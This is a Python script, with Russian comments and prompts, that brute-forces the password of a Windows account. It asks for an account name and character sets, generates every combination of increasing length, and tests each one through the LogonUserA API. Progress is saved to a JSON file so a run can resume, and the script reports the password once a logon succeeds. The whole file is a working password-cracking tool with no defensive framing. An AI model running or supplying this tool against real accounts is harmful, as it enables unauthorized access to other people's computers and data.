import ctypes
import win32security
import win32api
import itertools
import string
import time
import json
import os

time_start = int(time.time())

LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

russian_letters = 'абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'

characters = ''

progress_file = "progress.json"

digits_progress = 0
ascii_progress = 0
russian_letter_progress = 0
punc_progress = 0

# Функция для сохранения прогресса
def save_progress(length, try_id, tryed):
    with open(progress_file, 'w', encoding="cp1251") as f:
        json.dump(
            {"account": account,
                   'digits': digits_progress,
                   "ascii": ascii_progress,
                   "russian_letter": russian_letter_progress,
                   "punctuation": punc_progress,
                   'characters': characters,
                   'length': length,
                   'try_id': try_id,
                   'tryed': tryed
             },
                  f,
                  indent=4
                  )

# Функция для загрузки прогресса
def load_progress():
    try:
        if os.path.exists(progress_file):
            with open(progress_file, 'r', encoding="cp1251") as f:
                return json.load(f)
        else:
            if not os.path.isfile(progress_file):
                # Если файл не существует, создаем его с пустым объектом
                with open(progress_file, 'w') as f:
                    json.dump({}, f)  # Записываем пустой объект в файл
                print(f"Файл '{progress_file}' был создан.")

    except FileNotFoundError:
        print("Файл 'progress.json' не найден.")
        return None
    except json.JSONDecodeError as e:
        print(f"Ошибка декодирования JSON: {e}")
        return None
    return None

# Загрузка прогресса
progress = load_progress()
if progress:
    account = progress['account']
    i = progress['length']
    try_id = progress['try_id']
    tryed = progress['tryed']
    characters = progress['characters']
else:
    i = 1
    try_id = 0
    tryed = []
# Указываем имя пользователя и пароль
    account = str(input("Введите имя учетной записи: "))

    level = 0
    req_types = ["Вы хотите использовать числа для подбора: ( Y/n ) ",
                 "Вы хотите использовать латинские буквы для подбора: ( Y/n ) ",
                 "Вы хотите использовать кириллицу для подбора: ( Y/n ) ",
                 "Вы хотите использовать специальные символы для подбора: ( Y/n ) "]



    while True:

        if level == 4:
            break
        level += 1
        digits = str(input(f"{req_types[level - 1]}: "))
        if digits.lower() in ["y", "д"]:
            if level == 1:
                characters += string.digits
                digits_progress += 1
            if level == 2:
                characters += string.ascii_letters
                ascii_progress += 1
            if level == 3:
                characters += russian_letters
                russian_letter_progress += 1
            if level == 4:
                characters += string.punctuation
                punc_progress += 1
        elif digits.lower() in ["n", "н"]:
            pass
        else:
            print("Вы неправильно ввели, а нужно ( y / n )!")
            level -= 1

username = account  # Замените на ваше имя пользователя






# print("asdf " + characters)


found = False

try:
    while not found:
        for password in itertools.product(characters, repeat=i):
            password = "".join(password)
            if not password in tryed:
                try_id += 1
                # Попытка входа в систему
                token = ctypes.c_void_p()
                result = ctypes.windll.advapi32.LogonUserA(
                    username.encode('utf-8'),
                    None,  # Укажите домен, если необходимо
                    password.encode('utf-8'),
                    LOGON32_LOGON_INTERACTIVE,
                    LOGON32_PROVIDER_DEFAULT,
                    ctypes.byref(token)
                )

                if result:
                    print(f"Попытка № {try_id} увенчалась успехом, йоу! Вход выполнен успешно для пароля: {password}")
                    found = True
                    break
                else:
                    print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                    tryed.append(password)

                # Сохраняем прогресс после каждой попытки
                save_progress(i, try_id, tryed)

        # Увеличиваем длину пароля, если не нашли подходящий
        if not found:
            i += 1

except KeyboardInterrupt:

    save_progress(i, try_id, tryed)
    print("Программа прервана. Прогресс сохранен.")

except Exception as ex:
    print("Произошла ошибка: ", ex)

time_finish = int(time.time() - time_start)
print(f"{time_finish} секунд(ы)")


